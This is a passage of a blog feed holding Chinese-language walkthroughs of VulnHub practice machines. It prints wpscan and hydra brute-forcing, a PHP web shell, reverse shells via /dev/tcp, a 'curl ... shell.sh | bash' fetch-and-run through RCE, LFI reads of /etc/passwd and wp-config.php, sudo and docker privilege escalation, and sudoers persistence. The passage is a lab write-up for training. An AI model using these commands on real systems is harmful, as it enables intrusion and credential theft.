class=\"line\">wpscan --url http://192.168.31.230 --enumerate u --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-107.png\" alt></p>\n<p>-&gt; 用户 1:recon  用户 2:reconauthor</p>\n<ol start=\"3\">\n<li>wordpress 针对已知用户扫描密码</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过以下命令爆破wordpress用户名recon reconauthor的密码：</span></span><br><span class=\"line\">wpscan --url http://192.168.31.230/ - U &#x27;recon reconauthor&#x27; -P /usr/share/wordlists/rockyou.txt --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-108.png\" alt></p>\n<p>-&gt; 用户：reconauthor 密码：football7</p>\n<ol start=\"4\">\n<li>登陆 wordpress 后台<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjMwL3dwLWxvZ2luLnBocA==\"> http://192.168.31.230/wp-login.php</span><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-109.png\" alt><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-110.png\" alt></li>\n</ol>\n<h3 id=\"msf-测试-wordpress\"><a class=\"markdownIt-Anchor\" href=\"#msf-测试-wordpress\">#</a> msf 测试 wordpress</h3>\n<ol>\n<li>msf 自带 exploit/unix/webapp/ 下的模块进行利用<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-111.png\" alt></li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfconsole</span><br><span class=\"line\">use exploit/unix/webapp/wp_admin_shell_upload</span><br><span class=\"line\">set password **football7**</span><br><span class=\"line\">set rhosts 192.168.31. 230</span><br><span class=\"line\">set username **reconauthor**</span><br><span class=\"line\">set targeturi /</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p>-&gt; 认证成功，但上传失败</p>\n<h3 id=\"后台上传-poc\"><a class=\"markdownIt-Anchor\" href=\"#后台上传-poc\">#</a> 后台上传 poc</h3>\n<ol>\n<li>从网站后台寻找突破</li>\n</ol>\n<p>wordpress 后台上传文件 poc：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDY5ODE=\">https://www.exploit-db.com/exploits/46981</span><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-112.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;&lt;html&gt;I’m X_T, do you know me ?&lt;/html&gt;&quot; &gt; index.html</span><br><span class=\"line\">echo &quot;&lt;?php echo system($_GET[&#x27;X_T&#x27;]); ?&gt;&quot; &gt; index.php</span><br><span class=\"line\">zip poc.zip index.html index.php</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-113.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">依次按下列按钮点击</span></span><br><span class=\"line\">Create a new Post -&gt; Select `Add block` -&gt; E-Learning -&gt; Upload the poc.zip -&gt;</span><br><span class=\"line\">Insert as: Iframe -&gt; Insert</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-114.png\" alt><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-115.png\" alt><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-116.png\" alt><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-117.png\" alt><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-118.png\" alt></p>\n<p>-&gt; <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjMwL3dwLWNvbnRlbnQvdXBsb2Fkcy9hcnRpY3VsYXRlX3VwbG9hZHMvcG9jOS9pbmRleC5odG1s\">http://192.168.31.230/wp-content/uploads/articulate_uploads/poc9/index.html</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-119.png\" alt></p>\n<p>-&gt; RCE 地址：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjMwL3dwLWNvbnRlbnQvdXBsb2Fkcy9hcnRpY3VsYXRlX3VwbG9hZHMvcG9jOS9pbmRleC5waHA/WF9UPWxz\">http://192.168.31.230/wp-content/uploads/articulate_uploads/poc9/index.php?X_T=ls</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-120.png\" alt></p>\n<ol start=\"2\">\n<li>通过 RCE 漏洞反弹 shell</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">构造反弹shell地代码并开启http服务</span></span><br><span class=\"line\">cat &gt; shell.sh &lt;&lt; EOF</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">! /bin/bash</span></span><br><span class=\"line\">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1&#x27;</span><br><span class=\"line\">EOF</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在靶机上执行：</span></span><br><span class=\"line\">curl http://www.chentuo.asia/shell.sh | bash</span><br></pre></td></tr></table></figure>\n<p>-&gt; 即在 url 地址上构造：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjMwL3dwLWNvbnRlbnQvdXBsb2Fkcy9hcnRpY3VsYXRlX3VwbG9hZHMvcG9jOS9pbmRleC5waHA/WF9UPWN1cmwlMjBodHRwOi8vd3d3LmNoZW50dW8uYXNpYS9zaGVsbC5zaCUyMCU3QyUyMGJhc2g=\">http://192.168.31.230/wp-content/uploads/articulate_uploads/poc9/index.php?X_T=curl http://www.chentuo.asia/shell.sh | bash</span><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-121.png\" alt></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-122.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">标准shell</span></span><br><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; then press Ctrl+Z</span><br><span class=\"line\">stty raw -echo;fg then press ENTER twice</span><br><span class=\"line\">export TERM=xterm</span><br><span class=\"line\">cd / &amp;&amp; id</span><br></pre></td></tr></table></figure>\n<h3 id=\"suid-提权\"><a class=\"markdownIt-Anchor\" href=\"#suid-提权\">#</a> SUID 提权</h3>\n<p>尝试 suid 提权</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">发现系统上运行所有suid可执行文件</span></span><br><span class=\"line\">find / -perm -u=s -type f 2 &gt;/dev/null</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-perm表示搜索后面的权限 - u=s表示查找 root 用户拥有的文件</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-<span class=\"built_in\">type</span>表示我们正在寻找的文件类型 f 表示普通文件，而不是目录或特殊文件</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">2 表示到进程的第二个文件描述符，即 stderr（标准错误）&gt;表示重定向</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">/dev/null是一个特殊的文件系统对象，它会丢弃写入其中的所有内容。</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-123.png\" alt><br>\n未找到 nmap vim find bash more less nano cp 含有 s 权限</p>\n<h3 id=\"sudogdb-提权\"><a class=\"markdownIt-Anchor\" href=\"#sudogdb-提权\">#</a> sudo (gdb) 提权</h3>\n<p>提权教程：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZ2RiLw==\">https://gtfobins.github.io/gtfobins/gdb/</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">由于gdb只是针对用户offensivehack来言是无密码的</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">所以这里需要通过-u来指定用户名，使用该用户来通过gdb反弹shell</span></span><br><span class=\"line\">sudo -u offensivehack gdb -nx -ex &#x27;!sh&#x27; -ex quit</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-l, list user\\<span class=\"string\">&#x27;s privileges or check a specific command; use twice for longer format</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">-u, run command (or edit file) as specified user name or ID</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">通过python3 来将当前的终端转化为一个标准的shell：</span></span></span><br><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-124.png\" alt></p>\n<h3 id=\"iddocker-提权\"><a class=\"markdownIt-Anchor\" href=\"#iddocker-提权\">#</a> id (docker) 提权</h3>\n<p>注意到输入 id 的时候有补充组 docker，可采用 docker 提权<br>\n Docker 提权说明：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZG9ja2VyLw==\">https://gtfobins.github.io/gtfobins/docker/</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">docker 提权</span></span><br><span class=\"line\">docker run -v /:/mnt --rm -it alpine chroot /mnt sh</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">标准shell：</span></span><br><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-125.png\" alt></p>\n<h3 id=\"篡改-sudoers-维权\"><a class=\"markdownIt-Anchor\" href=\"#篡改-sudoers-维权\">#</a> 篡改 sudoers 维权</h3>\n<p>由当前 root 权限的机器继续执行操作</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置密码为kali</span></span><br><span class=\"line\">useradd kali &amp;&amp; passwd kali</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">添加sudoers文件写权限:</span> </span><br><span class=\"line\">chmod u+w /etc/sudoers</span><br><span class=\"line\">vim /etc/sudoers</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">root ALL=(ALL) ALL 这一行，在其下面追加：</span></span><br><span class=\"line\">kali ALL=(ALL) ALL</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">撤销sudoers文件权限:</span> </span><br><span class=\"line\">chmod u-w /etc/sudoers</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-126.png\" alt></p>\n<p>攻击机：ssh <span class=\"exturl\" data-url=\"bWFpbHRvOmthbGlAMTkyLjE2OC4zMS4yMzA=\">kali@192.168.31.230</span> &amp;&amp; sudo cat /root/flag.txt</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-127.png\" alt></p>\n<p>-&gt; 可登陆 kali，用 sudo 进行 root 权限的操作</p>\n",
            "tags": [
                "VULNHUB 1-10"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/110%20RED/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/110%20RED/",
            "title": "VULNHUB 10 RED",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcmVkLTEsNzUzLw==\">https://www.vulnhub.com/entry/red-1,753/</span><br>\n 教程链接地址 1：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9yZWFkeXNldGV4cGxvaXQud29yZHByZXNzLmNvbS8yMDIxLzExLzAyL2hhY2tpbmctbGFiLXJlZC8=\">https://readysetexploit.wordpress.com/2021/11/02/hacking-lab-red/</span><br>\n 教程链接地址 2：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lvdXRoQmVsaWVmL2FydGljbGUvZGV0YWlscy8xMjI0NTg3MDU=\">https://blog.csdn.net/YouthBelief/article/details/122458705</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 NAPPING：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<ol>\n<li>\n<p>通过 netdiscover 扫描当前网卡里边有哪些机器<br>\n <code>sudo netdiscover -i eth0 -r 192.168.31.0/24</code></p>\n</li>\n<li>\n<p>将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描</p>\n</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">shell</span></span><br><span class=\"line\">cat &gt; myip.txt &lt;&lt; EOF</span><br><span class=\"line\">192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33</span><br><span class=\"line\">192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP<br>\n <code>sudo nmap -PA 192.168.31.107 --excludefile myip.txt</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-193.png\" alt></p>\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.14</p>\n<ol start=\"4\">\n<li>确认靶机 ip 开放的端口信息</li>\n</ol>\n<p><code>sudo nmap -A -p- 192.168.31.14 -oN /tmp/red.txt</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-194.png\" alt></p>\n<p>-&gt; 靶机开放端口 22, 80</p>\n<h3 id=\"修改本地-hosts\"><a class=\"markdownIt-Anchor\" href=\"#修改本地-hosts\">#</a> 修改本地 hosts</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQ=\">http://192.168.31.14</span> 进行信息收集<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-195.png\" alt></p>\n<p>点击 “Hello Blue” 发现一个跳转界面，无法打开<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-196.png\" alt></p>\n<p>修改本地 hosts 文件 /etc/hosts, 改变 DNS 解析记录<br>\n 192.168.31.14 redrocks.win<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-197.png\" alt></p>\n<p>重新打开 url 地址，发现这里说网站已被攻击，并且有后门文件<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3JlZHJvY2tzd2luLzIwMjEvMTAvMjQvaGVsbG8td29ybGQv\"> http://redrocks.win/2021/10/24/hello-world/</span><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-198.png\" alt></p>\n<p>审查源代码，找到 Mr.Miessler 这个提示<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-199.png\" alt></p>\n<p>通过搜索，找到了这个人是 SecLists 的开发者<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-200.png\" alt></p>\n<h3 id=\"seclists-字典\"><a class=\"markdownIt-Anchor\" href=\"#seclists-字典\">#</a> seclists 字典</h3>\n<p>Seclists 是一个全面的字典，包括用户名、密码、URL、敏感数据模式、模糊测试负载、Web Shell 等等，在 kali 中 apt - y install seclists 安装，我们现在要想办法扫出来已被攻击服务器上的后门文件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用gobuster加载seclists中的通用后门字典进行扫描。</span></span><br><span class=\"line\">gobuster dir -u http://redrocks.win/ -w /usr/share/seclists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt -x php,txt,html</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-201.png\" alt></p>\n<p>找到一个后门文件 NetworkFileManagerPHP.php<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-202.png\" alt></p>\n<p>这应该就是后门文件了，但是我们没有参数值，需要爆破</p>\n<h3 id=\"wfuzz-爆破参数\"><a class=\"markdownIt-Anchor\" href=\"#wfuzz-爆破参数\">#</a> wfuzz 爆破参数</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用wfuzz加载seclists中的爆破参数名字的字典进行爆破</span></span><br><span class=\"line\">wfuzz -c -u http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=xxx -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-203.png\" alt></p>\n<p>得到的结果是 key 的返回值是 200<br>\n-&gt; 可以构造 <span class=\"exturl\" data-url=\"aHR0cDovL3JlZHJvY2tzLndpbi9OZXR3b3JrRmlsZU1hbmFnZXJQSFAucGhwP2tleT14eHg=\">http://redrocks.win/NetworkFileManagerPHP.php?key=xxx</span> 访问</p>\n<h3 id=\"lfi-文件包含漏洞\"><a class=\"markdownIt-Anchor\" href=\"#lfi-文件包含漏洞\">#</a> lfi 文件包含漏洞</h3>\n<p>尝试使用文件包含协议进行访问敏感文件</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3JlZHJvY2tzLndpbi9OZXR3b3JrRmlsZU1hbmFnZXJQSFAucGhwP2tleT0vZXRjL3Bhc3N3ZA==\">http://redrocks.win/NetworkFileManagerPHP.php?key=/etc/passwd</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-204.png\" alt></p>\n<p>尝试获取 NetworkFileManagerPHP.php 的源码<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3JlZHJvY2tzLndpbi9OZXR3b3JrRmlsZU1hbmFnZXJQSFAucGhwP2tleT1OZXR3b3JrRmlsZU1hbmFnZXJQSFAucGhw\"> http://redrocks.win/NetworkFileManagerPHP.php?key=NetworkFileManagerPHP.php</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-205.png\" alt></p>\n<p>发现内容显示不了，我们需要配合其他协议</p>\n<p>尝试用 php://filter/read=convert.base6 4 - encode/resource=xxx.php<br>\n 的 filter 协议去读取一些敏感文件<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3JlZHJvY2tzLndpbi9OZXR3b3JrRmlsZU1hbmFnZXJQSFAucGhwL05ldHdvcmtGaWxlTWFuYWdlclBIUC5waHA/a2V5\"> http://redrocks.win/NetworkFileManagerPHP.php/NetworkFileManagerPHP.php?key</span><br>\n=php://filter/read=convert.base64-encode/resource=NetworkFileManagerPHP.php<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-206.png\" alt></p>\n<p>对字符串进行 base64 解密</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-207.png\" alt></p>\n<p>继续读取文件，发现暗藏了一个 base64 密文，再次解密</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-208.png\" alt></p>\n<p>这里说是 “这个密码并不能帮助您！Hashcat 说规则就是规则”</p>\n<p>由于网站是 wordpress 搭建的，我们可以去访问数据库信息获取一些配置文<br>\n件，我们通过文件包含漏洞访问 wp-config.php 查看配置文件信息<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3JlZHJvY2tzLndpbi9OZXR3b3JrRmlsZU1hbmFnZXJQSFAucGhwL05ldHdvcmtGaWxlTWFuYWdlclBIUC5waHA/a2V5PXBocDovL2ZpbHRlci9yZWFkPWNvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT13cC1jb25maWcucGhw\"> http://redrocks.win/NetworkFileManagerPHP.php/NetworkFileManagerPHP.php?key=php://filter/read=convert.base64-encode/resource=wp-config.php</span><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-209.png\" alt></p>\n<p>通过 echo “xx” | base64 - d 的方式解密，得到数据库配置信息<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-210.png\" alt></p>\n<p>-&gt; 用户名：john 密码：R3v_m4lwh3r3_k1nG!!</p>\n<h3 id=\"hashcut-使用\"><a class=\"markdownIt-Anchor\" href=\"#hashcut-使用\">#</a> hashcut 使用</h3>\n<p>hashcat 生成密码对应的字典，hydra 连接 ssh<br>\nhashcat --stdout pass.txt -r /usr/share/hashcat/rules/best64.rule &gt; pass2.txt<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-211.png\" alt></p>\n<p>用 hydra 选择用户 john，密码为 hashcat 生成的字典进行连接 ssh<br>\nhydra -l john -P pass2.txt ssh://192.168.31.14 -f -t 4 -vV -o hydra.ssh<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-212.png\" alt></p>\n<p>-&gt; 用户名：join 密码：R3v_m4lwh3r3_k1nG!!21</p>\n<h3 id=\"sudotime提权\"><a class=\"markdownIt-Anchor\" href=\"#sudotime提权\">#</a> sudo (time) 提权</h3>\n<p>尝试登陆服务器的时候，发现密码是错误的<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-213.png\" alt></p>\n<p>再次用 hydra 破解 ssh 爆破，果然得到了不一样的密码，可能密码会定时修改<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-214.png\" alt></p>\n<p>登陆服务器，sudo -l 发现有 time 可提权<br>\n在 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v\">https://gtfobins.github.io/</span> 上找到提权命令，进行权限升级<br>\n <code>sudo -u ippsec /usr/bin/time /bin/bash</code> <br>\n<img data-src=\"/N1h1l157/VULNHUB/image-215.png\" alt></p>\n<p>此会话窗口不稳定，间断性的被中断，而且密码每隔一段时间都会被修改，因此我们需要反弹出来一个稳定的 shell<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-216.png\" alt></p>\n<p><code>bash -i &gt;&amp; /dev/tcp/192.168.31.135/4445 0&gt;&amp;1</code> <br>\n 通过此命令反弹出来的 shell 仍然会被中断</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">选择加载到/dev/shm/中来反弹shell,命令<span class=\"built_in\">cat</span>被改写用<span class=\"built_in\">echo</span>替代</span></span><br><span class=\"line\">echo &#x27;#!/bin/bash&#x27; &gt; /dev/shm/shell.sh</span><br><span class=\"line\">echo &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.135/4445 0&gt;&amp;1&#x27; &gt;&gt; /dev/shm/shell.sh</span><br><span class=\"line\">chmod +x /dev/shm/shell.sh</span><br><span class=\"line\">/dev/shm/shell.sh</span><br><span class=\"line\"></span><br><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\">stty raw -echo;fg</span><br><span class=\"line\">export TERM=xterm</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-217.png\" alt></p>\n<p>当原来的终端再次被强制退出的时候，我们的新终端貌似也出了一些意外<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-218.png\" alt></p>\n<p>我们只需要再次输入 python3 -c ‘import pty;pty.spawn (&quot;/bin/bash&quot;)’, 即可获得一个标准化的终端<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-219.png\" alt></p>\n<h3 id=\"pspy64s-监控\"><a class=\"markdownIt-Anchor\" href=\"#pspy64s-监控\">#</a> pspy64s 监控</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">寻找一些ippsec可以访问的东西</span></span><br><span class=\"line\">find / -group ippsec -type d 2&gt;/dev/null | grep -v proc</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-220.png\" alt></p>\n<p>发现我们可以访问位于 wordpress 目录中的 .git 目录<br>\n我们的终端一直在弹出消息，而且这个消息是在 ippsec 上执行的</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">现在我们可以运行pspy64s检查 Red 是否正在执行我们在/var/www/wordpress/.git 目录中找到的文件</span></span><br><span class=\"line\">wget https://github.com/DominicBreuker/pspy/archive/refs/heads/master.zip</span><br><span class=\"line\">python -m http.server 80</span><br><span class=\"line\">wget 192.168.31.135/pspy64s</span><br><span class=\"line\">./pspy64s</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-221.png\" alt></p>\n<p>看到 /usr/bin/gcc/var/www/wordpress/.git/supersecretfileuc.c -o /var/www/wordpress/.git/rev 被执行<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-222.png\" alt></p>\n<p>现在我们已经很明确了，supersecretfileuc.c 这个文件会被执行<br>\n而且是调用 root 权限去执行的这个文件，需要一个 c 的反弹 shell 的代码</p>\n<h3 id=\"各种语言反弹\"><a class=\"markdownIt-Anchor\" href=\"#各种语言反弹\">#</a> 各种语言反弹</h3>\n<p>各种语言反弹 shell 的代码：<br>\n<span class=\"exturl\" 